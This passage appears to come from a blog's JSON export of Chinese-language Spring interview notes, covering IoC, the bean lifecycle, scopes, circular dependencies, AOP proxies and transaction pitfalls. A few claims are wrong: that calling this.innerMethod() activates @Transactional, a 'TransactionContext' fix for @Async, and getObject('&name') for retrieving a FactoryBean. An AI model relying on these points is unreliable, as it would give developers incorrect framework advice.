PROPAGATION_MANDATORY：支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就抛出异常。\n\n④ PROPAGATION_REQUIRES_NEW：创建新事务，无论当前存不存在事务，都创建新事务。\n\n⑤ PROPAGATION_NOT_SUPPORTED：以非事务方式执行操作，如果当前存在事务，就把当前事务挂起。\n\n⑥ PROPAGATION_NEVER：以非事务方式执行，如果当前存在事务，则抛出异常。\n\n⑦ PROPAGATION_NESTED：如果当前存在事务，则在嵌套事务内执行。如果当前没有事务，则按REQUIRED属性执行。\n\n### spring事务失效的场景\n\n1. 非被Spring管理的Bean上的事务： 如果你在一个非被Spring容器管理的Bean（例如通过new关键字直接创建的对象）上使用事务注解，事务将不会生效。Spring的事务管理是基于AOP（面向切面编程）实现的，因此只能在由Spring容器管理的Bean上起作用。\n\n2. 未捕获的异常： 如果在事务内发生未捕获的运行时异常，事务将回滚。但是，如果异常被捕获并在方法内处理，事务可能不会回滚。确保在事务边界内处理异常或者允许异常传播到事务管理器以便正确回滚。\n\n   ```java\n   @Transactional\n   public void transactionalMethod() {\n       try {\n           // some code that may throw an exception\n       } catch (Exception e) {\n           // handle the exception (not recommended within a transaction)\n       }\n   }\n   ```\n\n3. 嵌套事务问题： Spring事务支持嵌套事务，但是嵌套事务的行为取决于底层事务管理器的支持。如果使用的事务管理器不支持嵌套事务，嵌套事务可能会被忽略，导致事务行为不一致。\n\n4. 方法调用问题： Spring事务是通过AOP实现的，它依赖于代理对象来拦截方法调用并处理事务。如果你在同一个类内部调用一个带有事务注解的方法，事务可能不会起作用，因为代理对象无法拦截内部方法的调用。确保事务注解生效，要么调用方法是通过代理对象，要么通过self-invocation，例如通过this关键字。\n\n   ```java\n   @Transactional\n   public class MyService {\n       public void outerMethod() {\n           innerMethod(); // Transactional annotation may not work here\n           this.innerMethod(); // Transactional annotation should work here\n       }\n   \n       @Transactional\n       public void innerMethod() {\n           // some transactional logic\n       }\n   }\n   \n   ```\n\n5. 异步方法问题： 如果使用了异步方法（通过@Async注解），事务可能会失效。在异步方法内，事务上下文可能无法正确传播，导致事务不起作用。要在异步方法中使用事务，可以使用TransactionContext传播方式。\n\n\n## spring使用的设计模式\n\n### 简单工厂\n\n**实现方式：**\n\nBeanFactory。Spring中的BeanFactory就是简单工厂模式的体现，根据传入一个唯一的标识来获得Bean对象，但是否是在传入参数后创建还是传入参数前创建这个要根据具体情况来定。\n\n**实现原理：**\n\nbean容器的启动阶段：\n\n读取bean的xml配置文件,将bean元素分别转换成一个BeanDefinition对象。\n然后通过BeanDefinitionRegistry将这些bean注册到beanFactory中，保存在它的一个ConcurrentHashMap中。\n将BeanDefinition注册到了beanFactory之后，在这里Spring为我们提供了一个扩展的切口，允许我们通过实现接口BeanFactoryPostProcessor\n在此处来插入我们定义的代码。典型的例子就是：PropertyPlaceholderConfigurer，我们一般在配置数据库的dataSource时使用到的占位符的值，就是它注入进去的。\n\n容器中bean的实例化阶段：\n\n实例化阶段主要是通过反射或者CGLIB对bean进行实例化，在这个阶段Spring又给我们暴露了很多的扩展点：\n\n各种的Aware接口 ，比如 BeanFactoryAware，对于实现了这些Aware接口的bean，在实例化bean时Spring会帮我们注入对应的BeanFactory的实例。 BeanPostProcessor接口\n，实现了BeanPostProcessor接口的bean，在实例化bean时Spring会帮我们调用接口中的方法。 InitializingBean接口\n，实现了InitializingBean接口的bean，在实例化bean时Spring会帮我们调用接口中的方法。 DisposableBean接口\n，实现了DisposableBean接口的bean，在该bean死亡时Spring会帮我们调用接口中的方法。\n\n**设计意义：**\n\n松耦合。\n可以将原来硬编码的依赖，通过Spring这个beanFactory这个工厂来注入依赖，也就是说原来只有依赖方和被依赖方，现在我们引入了第三方——spring这个beanFactory，由它来解决bean之间的依赖问题，达到了松耦合的效果.\n\nbean的额外处理。 通过Spring接口的暴露，在实例化bean的阶段我们可以进行一些额外的处理，这些额外的处理只需要让bean实现对应的接口即可，那么spring就会在bean的生命周期调用我们实现的接口来处理该bean。[非常重要]\n\n### 工厂方法\n\n**实现方式：**\n\nFactoryBean接口。\n\n**实现原理：**\n\n实现了FactoryBean接口的bean是一类叫做factory的bean。其特点是，spring会在使用getBean()调用获得该bean时，会自动调用该bean的getObject()\n方法，所以返回的不是factory这个bean，而是这个bean.getOjbect()方法的返回值。\n\n### 单例模式\n\nSpring依赖注入Bean实例默认是单例的。\n\nSpring的依赖注入（包括lazy-init方式）都是发生在AbstractBeanFactory的getBean里。getBean的doGetBean方法调用getSingleton进行bean的创建。\n\n### 适配器模式\n\n**实现方式：**\n\nSpringMVC中的适配器HandlerAdatper。\n\n**实现原理：**\n\nHandlerAdatper根据Handler规则执行不同的Handler。\n\n**实现过程：**\n\nDispatcherServlet根据HandlerMapping返回的handler，向HandlerAdatper发起请求，处理Handler。\n\nHandlerAdapter根据规则找到对应的Handler并让其执行，执行完毕后Handler会向HandlerAdapter返回一个ModelAndView，最后由HandlerAdapter向DispatchServelet返回一个ModelAndView。\n\n### 装饰器模式\n\n**实现方式：**\n\nSpring中用到的包装器模式在类名上有两种表现：一种是类名中含有Wrapper，另一种是类名中含有Decorator。\n\n**实质：**\n\n动态地给一个对象添加一些额外的职责。\n\n就增加功能来说，Decorator模式相比生成子类更为灵活。\n\n### 代理模式\n\n**实现方式：**\n\nAOP底层，就是动态代理模式的实现。\n\n**动态代理：**\n\n在内存中构建的，不需要手动编写代理类\n\n## spring中properties和yml的加载顺序\n\n相同内容properties和yml的加载顺序是properties优先\n\n## 使用@Autowired注解自动装配的过程是怎样的？\n\n使用@Autowired注解来自动装配指定的bean。在使用@Autowired注解之前需要在Spring配置文件进行配置，<context:annotation-config />。\n\n在启动spring\nIoC时，容器自动装载了一个AutowiredAnnotationBeanPostProcessor后置处理器，当容器扫描到@Autowied、@Resource或@Inject时，就会在IoC容器自动查找需要的bean，并装配给该对象的属性。在使用@Autowired时，首先在容器中查询对应类型的bean：\n\n- 如果查询结果刚好为一个，就将该bean装配给@Autowired指定的数据；\n- 如果查询的结果不止一个，那么@Autowired会根据名称来查找；\n- 如果上述查找的结果为空，那么会抛出异常。解决方法是，使用required=false。\n\n## @Autowired和@Resource之间的区别\n\n@Autowired可用于：构造函数、成员变量、Setter方法\n\n@Autowired和@Resource之间的区别\n\n- @Autowired默认是按照类型装配注入的，默认情况下它要求依赖对象必须存在（可以设置它required属性为false）。\n- @Resource默认是按照名称来装配注入的，只有当找不到与名称匹配的bean才会按照类型来装配注入。\n\n## Spring中BeanFactory与FactoryBean的区别\n\n### BeanFactory\n\nBeanFactory是一个接口，它是Spring中工厂的顶层规范，是SpringIoc容器的核心接口，它定义了getBean()、containsBean()等管理Bean的通用方法。Spring的容器都是它的具体实现如：\n\n- DefaultListableBeanFactory\n- XmlBeanFactory\n- ApplicationContext\n\n这些实现类又从不同的维度分别有不同的扩展。\n\n### FactoryBean\n\n首先它是一个Bean，但又不仅仅是一个Bean。它是一个能生产或修饰对象生成的工厂Bean，类似于设计模式中的工厂模式和装饰器模式。它能在需要的时候生产一个对象，且不仅仅限于它自身，它能返回任何Bean的实例。\n\nFactoryBean表现的是一个工厂的职责。 即一个Bean A如果实现了FactoryBean接口，那么A就变成了一个工厂，根据A的名称获取到的实际上是工厂调用getObject()\n返回的对象，而不是A本身，如果要获取工厂A自身的实例，那么需要在名称前面加上'&'符号。\n\n- getObject('name')返回工厂中的实例\n- getObject('&name')返回工厂本身的实例\n","source":"_posts/Spring最热点面试题.md","raw":"---\ntitle: Spring最热点面试题\ndate: 2024-05-26 22:42:28\ntags: spring\ncategories: 面试\n---\n\n# spring\n\n## 架构图\n\n![结构图](./2024/05/26/Spring最热点面试题/1.png)\n\n## 模块\n\n### Core Container\n\n核心容器(Core Container)\n\n- `spring-beans` 该模块是依赖注入IoC与DI的最基本实现\n- `spring-core` 该模块是Bean工厂与bean的装配\n- `spring-context` 该模块构架于核心模块之上，它扩展了 BeanFactory，为它添加了 Bean 生命周期控制、框架事件体系以及资源加载透明化等功能。ApplicationContext 是该模块的核心接口，它的超类是\n  BeanFactory。与BeanFactory 不同，ApplicationContext 容器实例化后会自动对所有的单实例 Bean 进行实例化与依赖关系的装配，使之处于待用状态\n- `spring-context-indexer` 该模块是 Spring 的类管理组件和 Classpath 扫描\n- `spring-context-support` 该模块是对 Spring IOC 容器的扩展支持，以及 IOC 子容器\n- `spring-expression` 该模块是Spring表达式语言块是统一表达式语言（EL）的扩展模块，可以查询、管理运行中的对象，同时也方便的可以调用对象方法、操作数组、集合等\n\n### Data Access/Integration\n\n数据访问/集成\n\n- `spring-jdbc` 该模块提供了 JDBC抽象层，它消除了冗长的 JDBC 编码和对数据库供应商特定错误代码的解析\n- `spring-tx` 该模块支持编程式事务和声明式事务，可用于实现了特定接口的类和所有的 POJO 对象。编程式事务需要自己写beginTransaction()、commit()、rollback()\n  等事务管理方法，声明式事务是通过注解或配置由 spring 自动处理，编程式事务粒度更细\n- `spring-orm` 该模块提供了对流行的对象关系映射 API的集成，包括 JPA、JDO 和 Hibernate 等。通过此模块可以让这些 ORM 框架和 spring 的其它功能整合，比如前面提及的事务管理\n- `spring-oxm` 该模块提供了对 OXM 实现的支持，比如JAXB、Castor、XML Beans、JiBX、XStream等\n- `spring-jms` 该模块包含生产（produce）和消费（consume）消息的功能。从Spring 4.1开始，集成了 spring-messaging 模块\n\n### Web\n\n网络部分\n\n- `spring-web` 该模块为 Spring 提供了最基础 Web 支持，主要建立于核心容器之上，通过 Servlet 或者 Listeners 来初始化 IOC 容器，也包含一些与 Web 相关的支持\n- `spring-webmvc` 该模块众所周知是一个的 Web-Servlet 模块，实现了 Spring MVC（model-view-Controller）的 Web 应用\n- `spring-websocket` 该模块主要是与 Web 前端的全双工通讯的协议\n- `spring-webflux` 该模块是一个新的非堵塞函数式 Reactive Web 框架，可以用来建立异步的，非阻塞，事件驱动的服务，并且扩展性非常好。\n\n### 面向切面编程(AOP和Aspects)\n\n- `spring-aop` 该模块是Spring的另一个核心模块，是 AOP 主要的实现模块\n- `spring-aspects` 该模块提供了对 AspectJ 的集成，主要是为 Spring AOP提供多种 AOP 实现方法，如前置方法后置方法等\n\n### 设备(Instrumentation)\n\n- `spring-instrument` 该模块是基于JAVA SE 中的\"java.lang.instrument\"进行设计的，应该算是 AOP的一个支援模块，主要作用是在 JVM\n  启用时，生成一个代理类，程序员通过代理类在运行时修改类的字节，从而改变一个类的功能，实现 AOP 的功能\n\n### 消息(Messaging)\n\n- `spring-messaging` 是从 Spring4 开始新加入的一个模块，主要职责是为 Spring 框架集成一些基础的报文传送应用\n\n### 测试(Test)\n\n- `spring-test` 主要为测试提供支持的，通过 JUnit 和 TestNG 组件支持单元测试和集成测试。它提供了一致性地加载和缓存 Spring 上下文，也提供了用于单独测试代码的模拟对象（mock object）\n\n## IOC\n\n### IOC是什么？\n\n控制反转即IoC (Inversion of Control)，它把传统上由程序代码直接操控的对象的调用权交给容器，通过容器来实现对象组件的装配和管理。所谓的“控制反转”概念就是对组件对象控制权的转移，从程序代码本身转移到了外部容器。\n\nSpring IOC 负责创建对象，管理对象（通过依赖注入（DI），装配对象，配置对象，并且管理这些对象的整个生命周期。\n\n### 使用IOC的好处\n\n- 不用自己组装，拿来就用。\n- 享受单例的好处，效率高，不浪费空间\n- 便于单元测试，方便切换mock组件\n- 便于进行AOP操作，对于使用者是透明的\n- 统一配置，便于修改\n\n## BeanFactory 和 ApplicationContext有什么区别\n\nBeanFactory和ApplicationContext是Spring的两大核心接口，都可以当做Spring的容器。其中ApplicationContext是BeanFactory的子接口。\n\n### 依赖关系\n\nBeanFactory：是Spring里面最底层的接口，包含了各种Bean的定义，读取bean配置文档，管理bean的加载、实例化，控制bean的生命周期，维护bean之间的依赖关系。\n\nApplicationContext接口作为BeanFactory的派生，除了提供BeanFactory所具有的功能外，还提供了更完整的框架功能：\n\n- 继承MessageSource，因此支持国际化。\n- 统一的资源文件访问方式。\n- 提供在监听器中注册bean的事件。\n- 同时加载多个配置文件。\n- 载入多个（有继承关系）上下文 ，使得每一个上下文都专注于一个特定的层次，比如应用的web层。\n\n### 加载方式\n\nBeanFactroy采用的是延迟加载形式来注入Bean的，即只有在使用到某个Bean时(调用getBean())\n，才对该Bean进行加载实例化。这样，我们就不能发现一些存在的Spring的配置问题。如果Bean的某一个属性没有注入，BeanFacotry加载后，直至第一次使用调用getBean方法才会抛出异常。\n\nApplicationContext，它是在容器启动时，一次性创建了所有的Bean。这样，在容器启动时，我们就可以发现Spring中存在的配置错误，这样有利于检查所依赖属性是否注入。\nApplicationContext启动后预载入所有的单实例Bean，通过预载入单实例bean ,确保当你需要的时候，你就不用等待，因为它们已经创建好了。\n\n相对于基本的BeanFactory，ApplicationContext 唯一的不足是占用内存空间。当应用程序配置Bean较多时，程序启动较慢。\n\n### 创建方式\n\nBeanFactory通常以编程的方式被创建，ApplicationContext还能以声明的方式创建，如使用ContextLoader。\n\n### 注册方式\n\nBeanFactory和ApplicationContext都支持BeanPostProcessor、BeanFactoryPostProcessor的使用，但两者之间的区别是：BeanFactory需要手动注册，而ApplicationContext则是自动注册。\n\n### Spring IoC的初始化过程\n\n#### IOC粗略总结\n\n1. 首先入口是xml或者注解或者其他形式，要实现beanDefinationReader接口，然后 读取的时候，会将他们解析为bean的定义信息；\n2. beanFactory在加载bean信息实例化（底层用的反射）之前，spring加了一个接口beanFactoryPostProcessor,用作扩展用。\n3. beanFactory内部实例化bean之后，在要初始化bean对象之前，增加了一个一系列aware接口，将他的容器，以及工厂都暴露出来供使用者做扩展用。\n4. 经过一些列容器以及容器对象的注入之后，在初始化之前，spring又增加了一个接口 beanPostProcessor,该接口是可以作用于所有创建的bean,在初始化前后，均能通过重写该接口获取bean对象进行定制操作。\n5. 经过实现初始化接口完成初始化功能。\n6. 经过实现销毁接口disposableBean结束其生命。\n\n#### 重要的组件\n\n- `BeanDefinition` 描述bean的属性的接口，例如bean的scope是单例还是多例，构造方法，有哪些property value，依赖等，相当于对这个bean的一份身份描述\n    - Bean配置 --> BeanDefinition --> Bean对象\n      -\n      懒加载情况下，refresh只是把BeanDefinition注册到BeanFactory中，而不是把Bean注册到BeanFactory中。在调用上下文的getBean的时候才会去根据BeanDefinition生成具体的bean对象\n- `BeanDefinitionMap`\n- `BeanFactory`\n    - spring的基础bean容器\n    - 相当于存放所有bean的容器\n- `ApplicationContext`\n    - BeanFactory 的子接口，在 BeanFactory 的基础上构建，是相对比较高级的 IoC 容器实现。包含 BeanFactory\n      的所有功能，还提供了其他高级的特性，比如：事件发布、国际化信息支持、统一资源加载策略等。正常情况下，我们都是使用的 ApplicationContext\n    - 相当于丰富了beanfactory的功能，这里理解为上下文就好\n- `FactoryBean`\n\n#### 源码解析\n\n首先抛开其他组件的启动，我们只需要引入spring-context就可以启动一个容器了\n\n```xml\n<dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-context</artifactId>\n</dependency>\n```\n\n而在springboot出来之前最常见的加载bean的方式是读取配置文件\n\n```java\npublic static void main(String[]args){\n        ApplicationContext context=new ClassPathXmlApplicationContext(\"classpath:applicationfile.xml\");\n}\n```\n\n这里ApplicationContext是一个接口，主要的实现类有：\n\n- ClassPathXmlApplicationContext 需要一个 xml 配置文件在系统中的路径\n- FileSystemXmlApplicationContext 需要一个 xml 配置文件在系统中的路径\n- AnnotationConfigApplicationContext 基于注解，大势所趋\n\n下面的分析都基于 ClassPathXmlApplicationContext 进行分析，因为比较好理解点\n\n在 resources 目录新建一个配置文件，文件名随意，通常叫 application.xml 或 application-xxx.xml就可以了,对应的类实现一个：\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<beans xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns=\"http://www.springframework.org/schema/beans\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"\n       default-autowire=\"byName\">\n\n    <bean id=\"messageService\" class=\"com.javadoop.example.MessageServiceImpl\"/>\n</beans>\n```\n\nmain\n\n```java\npublic class App {\n    public static void main(String[] args) {\n        // 用我们的配置文件来启动一个 ApplicationContext\n        ApplicationContext context = new ClassPathXmlApplicationContext(\"classpath:application.xml\");\n\n        System.out.println(\"context 启动成功\");\n\n        // 从 context 中取出我们的 Bean，而不是用 new MessageServiceImpl() 这种方式\n        MessageService messageService = context.getBean(MessageService.class);\n        // 这句将输出: hello world\n        System.out.println(messageService.getMessage());\n    }\n}\n```\n\n在构造方法中的refresh()方法是启动加载整个容器的关键方法\n\n方法在springboot容器启动时也会加载,方法为\n\n- org.springframework.boot.SpringApplication#run\n- org.springframework.boot.SpringApplication#refreshContext\n\n```java\n@Override\npublic void refresh()throws BeansException,IllegalStateException{\n    // 1. 首先是一个synchronized加锁，当然要加锁，不然你先调一次refresh()然后这次还没处理完又调一次，就会乱套了；\n    synchronized (this.startupShutdownMonitor){\n        // 2. 这个方法是做准备工作的，记录容器的启动时间、标记“已启动”状态、处理配置文件中的占位符，可以点进去看看，这里就不多说了。\n        prepareRefresh();\n\n        // 3. 这个就很重要了，这一步是把配置文件解析成一个个Bean，并且注册到BeanFactory中，注意这里只是注册进去，并没有初始化。先继续往下看，等会展开这个方法详细解读\n        ConfigurableListableBeanFactory beanFactory=obtainFreshBeanFactory();\n\n        //4. 这个方法的作用是：设置 BeanFactory 的类加载器，添加几个 BeanPostProcessor，手动注册几个特殊的 bean，这里都是spring里面的特殊处理，然后继续往下看\n        prepareBeanFactory(beanFactory);\n\n        try{\n            // 5. 方法是提供给子类的扩展点，到这里的时候，所有的 Bean 都加载、注册完成了，但是都还没有初始化，具体的子类可以在这步的时候添加一些特殊的 BeanFactoryPostProcessor 的实现类，来完成一些其他的操作。\n            postProcessBeanFactory(beanFactory);\n    \n            // 6. 接下来是这个方法是调用 BeanFactoryPostProcessor 各个实现类的 postProcessBeanFactory(factory) 方法；\n            invokeBeanFactoryPostProcessors(beanFactory);\n    \n            // 7. 然后这个方法注册 BeanPostProcessor 的实现类，和上面的BeanFactoryPostProcessor 是有区别的，这个方法调用的其实是PostProcessorRegistrationDelegate类的registerBeanPostProcessors方法；\n            // 这个类里面有个内部类BeanPostProcessorChecker，BeanPostProcessorChecker里面有两个方法postProcessBeforeInitialization和postProcessAfterInitialization，这两个方法分别在 Bean 初始化之前和初始化之后得到执行。\n            // 然后回到refresh()方法中继续往下看\n            registerBeanPostProcessors(beanFactory);\n    \n            // 8. 方法是初始化当前 ApplicationContext 的 MessageSource，国际化处理，继续往下\n            initMessageSource();\n    \n            // 9. 方法初始化当前 ApplicationContext 的事件广播器继续往下\n            initApplicationEventMulticaster();\n    \n            // 10. 方法初始化一些特殊的 Bean（在初始化 singleton beans 之前）；继续往下\n            onRefresh();\n    \n            // 11. 方法注册事件监听器，监听器需要实现 ApplicationListener 接口；继续往下\n            registerListeners();\n    \n            // 12. 重点到了 初始化所有的 singleton beans（单例bean），懒加载（non-lazy-init）的除外，这个方法也是等会细说\n            finishBeanFactoryInitialization(beanFactory);\n    \n            // 13. 方法是最后一步，广播事件，ApplicationContext 初始化完成\n            finishRefresh();\n        } catch(BeansException ex){\n            if(logger.isWarnEnabled()){\n                logger.warn(\"Exception encountered during context initialization - \"+\"cancelling refresh attempt: \"+ex);\n            }\n\n            // Destroy already created singletons to avoid dangling resources.\n            // 销毁已经初始化的 singleton 的 Beans，以免有些 bean 会一直占用资源\n            destroyBeans();\n    \n            // Reset 'active' flag.\n            cancelRefresh(ex);\n    \n            // Propagate exception to caller.\n            throw ex;\n        } finally{\n            // Reset common introspection caches in Spring's core, since we\n            // might not ever need metadata for singleton beans anymore...\n            resetCommonCaches();\n        }\n    }\n}\n```\n\n### Spring bean的生命周期\n\nSpring Bean的生命周期分为四个阶段和多个扩展点。扩展点又可以分为影响多个Bean和影响单个Bean。整理如下：\n\n四个阶段\n\n- 实例化 Instantiation\n- 属性赋值 Populate\n- 初始化 Initialization\n- 销毁 Destruction\n\n多个扩展点\n\n- 影响多个Bean\n    - BeanPostProcessor(作用于初始化阶段的前后)\n    - InstantiationAwareBeanPostProcessor(作用于实例化阶段的前后)\n- 影响单个Bean\n    - Aware(Aware类型的接口的作用就是让我们能够拿到Spring容器中的一些资源)\n        - Aware Group1\n            - BeanNameAware\n            - BeanClassLoaderAware\n            - BeanFactoryAware\n        - Aware Group2\n            - EnvironmentAware\n            - EmbeddedValueResolverAware(实现该接口能够获取Spring EL解析器，用户的自定义注解需要支持spel表达式的时候可以使用)\n            - ApplicationContextAware(ResourceLoaderAware\\ApplicationEventPublisherAware\\MessageSourceAware)\n    - 生命周期(实例化和属性赋值都是Spring帮助我们做的，能够自己实现的有初始化和销毁两个生命周期阶段)\n        - InitializingBean\n        - DisposableBean\n\n### bean的作用域\n\nSpring Bean 中所说的作用域，在配置文件中即是“scope”\n\n在面向对象程序设计中作用域一般指对象或变量之间的可见范围。\n\n而在Spring容器中是指其创建的Bean对象相对于其他Bean对象的请求可见范围。\n\n在Spring 容器当中，一共提供了5种作用域类型，在配置文件中，通过属性scope来设置bean的作用域范围\n\n#### singleton\n\n```xml\n<bean id=\"userInfo\" class=\"cn.lovepi.UserInfo\" scope=\"singleton\"></bean>\n```\n\n当Bean的作用域为singleton的时候,Spring容器中只会存在一个共享的Bean实例，所有对Bean的请求只要id与bean的定义相匹配，则只会返回bean的同一实例。单一实例会被存储在单例缓存中，为Spring的缺省作用域。\n\n#### prototype\n\n```xml\n<bean id=\"userInfo\" class=\"cn.lovepi.UserInfo\" scope=\" prototype \"></bean>\n```\n\n每次对该Bean请求的时候，Spring IoC都会创建一个新的作用域。\n\n对于有状态的Bean应该使用prototype，对于无状态的Bean则使用singleton\n\n#### request\n\n```xml\n<bean id=\"userInfo\" class=\"cn.lovepi.UserInfo\" scope=\" request \"></bean>\n```\n\nRequest作用域针对的是每次的Http请求，Spring容器会根据相关的Bean的\n\n定义来创建一个全新的Bean实例。而且该Bean只在当前request内是有效的。\n\n#### session\n\n```xml\n<bean id=\"userInfo\" class=\"cn.lovepi.UserInfo\" scope=\" session \"></bean>\n```\n\n针对http session起作用，Spring容器会根据该Bean的定义来创建一个全新的Bean的实例。而且该Bean只在当前http session内是有效的。\n\n#### global session\n\n```xml\n<bean id=\"userInfo\" class=\"cn.lovepi.UserInfo\" scope=\"globalSession\"></bean>\n```\n\n类似标准的http session作用域，不过仅仅在基于portlet的web应用当中才有意义。Portlet规范定义了全局的Session的概念。他被所有构成某个portlet外部应用中的各种不同的portlet所共享。在global\nsession作用域中所定义的bean被限定于全局的portlet session的生命周期范围之内。\n\n### 循环依赖问题\n\n#### 三级缓存\n\nSpring 解决循环依赖的核心就是提前暴露对象，而提前暴露的对象就是放置于第二级缓存中。下表是三级缓存的说明：\n\n| 名称                  | 描述                                                         |\n| --------------------- | ------------------------------------------------------------ |\n| singletonObjects      | 一级缓存，存放完整的 Bean。                                  |\n| earlySingletonObjects | 二级缓存，存放提前暴露的Bean，Bean 是不完整的，未完成属性注入和执行 init 方法。 |\n| singletonFactories    | 三级缓存，存放的是 Bean 工厂，主要是生产 Bean，存放到二级缓存中。 |\n\n所有被Spring 管理的 Bean，最终都会存放在 singletonObjects 中，这里面存放的 Bean 是经历了所有生命周期的（除了销毁的生命周期），完整的，可以给用户使用的。\n\nearlySingletonObjects 存放的是已经被实例化，但是还没有注入属性和执行 init 方法的 Bean。\n\nsingletonFactories 存放的是生产 Bean 的工厂。\n\nBean 都已经实例化了，为什么还需要一个生产 Bean 的工厂呢？这里实际上是跟 AOP 有关，如果项目中不需要为 Bean 进行代理，那么这个 Bean 工厂就会直接返回一开始实例化的对象，如果需要使用 AOP 进行代理，那么这个工厂就会发挥重要的作用了，这也是本文需要重点关注的问题之一。\n\n#### 解决循环依赖\n\nSpring 是如何通过上面介绍的三级缓存来解决循环依赖的呢？这里只用 A，B 形成的循环依赖来举例：\n\n1. 实例化 A，此时 A 还未完成属性填充和初始化方法（@PostConstruct）的执行，A 只是一个半成品。\n2. 为 A 创建一个 Bean 工厂，并放入到  singletonFactories 中。\n3. 发现 A 需要注入 B 对象，但是一级、二级、三级缓存均为发现对象 B。\n4. 实例化 B，此时 B 还未完成属性填充和初始化方法（@PostConstruct）的执行，B 只是一个半成品。\n5. 为 B 创建一个 Bean 工厂，并放入到  singletonFactories 中。\n6. 发现 B 需要注入 A 对象，此时在一级、二级未发现对象 A，但是在三级缓存中发现了对象 A，从三级缓存中得到对象 A，并将对象 A 放入二级缓存中，同时删除三级缓存中的对象 A。（注意，此时的 A 还是一个半成品，并没有完成属性填充和执行初始化方法）\n7. 将对象 A 注入到对象 B 中。\n8. 对象 B 完成属性填充，执行初始化方法，并放入到一级缓存中，同时删除二级缓存中的对象 B。（此时对象 B 已经是一个成品）\n9. 对象 A 得到对象 B，将对象 B 注入到对象 A 中。（对象 A 得到的是一个完整的对象 B）\n10. 对象 A 完成属性填充，执行初始化方法，并放入到一级缓存中，同时删除二级缓存中的对象 A。\n\n\n## Spring框架中的单例bean是否线程安全\n\nSpring框架中的单例bean是线程安全的吗？它是如何处理线程并发问题的?\n\n不是，Spring框架中的单例bean不是线程安全的。\n\nspring 中的 bean 默认是单例模式，spring 框架并没有对单例 bean 进行多线程的封装处理。实际上大部分 spring bean 是无状态的（比如 dao 类），在某种程度上来说 bean 也是安全的，但如果 bean\n有状态的话（比如 view model ）就要开发者自己去保证线程安全了，最简单的就是改变 bean 的作用域，把“singleton”变更为“prototype”，这样请求 bean 相当于 new Bean()了， 保证线程安全了。\n\n- 有状态就是有数据存储功能。\n- 无状态就是不会保存数据。\n\nSpring如何处理线程并发问题?\n\n一般只有无状态的Bean才可以在多线程下共享，大部分是无状态的Bean。当存有状态的Bean的时候，spring一般是使用ThreadLocal进行处理，解决线程安全问题。\n\nThreadLocal和线程同步机制都是为了解决多线程中相同变量的访问冲突问题。 同步机制采用了“时间换空间”的方式，仅提供一份变量，不同的线程获取锁，没获得锁的线程则需要排队。而ThreadLocal采用了“空间换时间”的方式。\nThreadLocal会为每一个线程提供一个独立的变量副本，从而隔离了多个线程对数据的访问冲突。因为每一个线程都拥有自己的变量副本，所以没有相同变量的访问冲突问题。所以在编写多线程代码时，可以把不安全的变量封装进ThreadLocal。\n\n## AOP\n\nOOP(Object-Oriented Programming)面向对象编程，允许开发者定义纵向的关系，但并适用于定义横向的关系，导致了大量代码的重复，而不利于各个模块的重用。\n\nAOP(Aspect-Oriented Programming)\n，一般称为面向切面编程，作为面向对象的一种补充，用于将那些与业务无关，但却对多个对象产生影响的公共行为和逻辑，抽取并封装为一个可重用的模块，这个模块被命名为“切面”（Aspect），减少系统中的重复代码，降低了模块间的耦合度，同时提高了系统的可维护性。可用于权限认证、日志、事务处理等。\n\n### AOP原理\n\n原理是在IOC过程中，创建bean实例时，最后都会对bean进行处理来实现增强，对于AOP来说就是创建代理类\n\n- 底层是动态代理技术\n    - JDK动态代理(基于接口)\n    - CGLib动态代理(基于类)\n    - 在Spring AOP中，如果使用的是单例，推荐使用CGLib代理\n\n### JDK动态代理\n\n(一）实现原理\n\nJDK的动态代理是基于反射实现。JDK通过反射，生成一个代理类，这个代理类实现了原来那个类的全部接口，并对接口中定义的所有方法进行了代理。当我们通过代理对象执行原来那个类的方法时，代理类底层会通过反射机制，回调我们实现的InvocationHandler接口的invoke方法。并且这个代理类是Proxy类的子类（记住这个结论，后面测试要用）。这就是JDK动态代理大致的实现方式。\n\n（二）优点\n\nJDK动态代理是JDK原生的，不需要任何依赖即可使用；\n\n通过反射机制生成代理类的速度要比CGLib操作字节码生成代理类的速度更快；\n\n（三）缺点\n\n如果要使用JDK动态代理，被代理的类必须实现了接口，否则无法代理；\n\nJDK动态代理无法为没有在接口中定义的方法实现代理，假设我们有一个实现了接口的类，我们为它的一个不属于接口中的方法配置了切面，Spring仍然会使用JDK的动态代理，但是由于配置了切面的方法不属于接口，为这个方法配置的切面将不会被织入。\n\nJDK动态代理执行代理方法时，需要通过反射机制进行回调，此时方法执行的效率比较低；\n\n### CGLib动态代理\n\n（一）实现原理\n\nCGLib实现动态代理的原理是，底层采用了ASM字节码生成框架，直接对需要代理的类的字节码进行操作，生成这个类的一个子类，并重写了类的所有可以重写的方法，在重写的过程中，将我们定义的额外的逻辑（简单理解为Spring中的切面）织入到方法中，对方法进行了增强。而通过字节码操作生成的代理类，和我们自己编写并编译后的类没有太大区别。\n\n（二）优点\n\n使用CGLib代理的类，不需要实现接口，因为CGLib生成的代理类是直接继承自需要被代理的类；\n\nCGLib生成的代理类是原来那个类的子类，这就意味着这个代理类可以为原来那个类中，所有能够被子类重写的方法进行代理；\n\nCGLib生成的代理类，和我们自己编写并编译的类没有太大区别，对方法的调用和直接调用普通类的方式一致，所以CGLib执行代理方法的效率要高于JDK的动态代理；\n\n（三）缺点\n\n由于CGLib的代理类使用的是继承，这也就意味着如果需要被代理的类是一个final类，则无法使用CGLib代理；\n\n由于CGLib实现代理方法的方式是重写父类的方法，所以无法对final方法，或者private方法进行代理，因为子类无法重写这些方法；\n\nCGLib生成代理类的方式是通过操作字节码，这种方式生成代理类的速度要比JDK通过反射生成代理类的速度更慢；\n\n### AOP术语\n\n#### 连接点(Join point)\n\n能够被拦截的地方\n\n#### 切点(Poincut)\n\n具体定位的连接点\n\n#### 增强/通知(Advice)\n\n表示添加到切点的一段逻辑代码，并定位连接点的方位信息\n\n#### 织入(Weaving)\n\n将增强/通知添加到目标类的具体连接点上的过程。\n\n#### 引入/引介(Introduction)\n\n允许我们向现有的类添加新方法或属性。是一种特殊的增强！\n\n#### 切面(Aspect)\n\n切面由切点和增强/通知组成，它既包括了横切逻辑的定义、也包括了连接点的定义\n\n### Spring对AOP的支持\n\n- 